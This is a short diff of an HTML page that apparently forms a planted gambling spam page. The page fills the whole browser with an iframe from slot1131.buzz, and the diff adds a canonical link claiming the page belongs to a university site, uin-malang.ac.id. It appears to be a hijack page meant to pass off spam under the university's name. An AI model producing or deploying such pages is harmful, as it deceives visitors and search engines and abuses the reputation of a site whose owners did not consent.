@@ -2,9 +2,10 @@
 <head>
 <title></title>
 <style>
+
 html,body{height:100%}
 </style> 
-</head> <link rel="amphtml" href="https://slot1131.buzz/rootbeer/amp/uin-malang/"/>
+</head> <link rel="amphtml" href="https://slot1131.buzz/rootbeer/amp/uin-malang/"/>  <link rel="canonical" href="https://tm.uin-malang.ac.id/isi/"/>
 <body>
 <iframe src="https://slot1131.buzz/rootbeer/amp/uin-malang/a.html" height="100%" width="100%" ></iframe>
 </body>
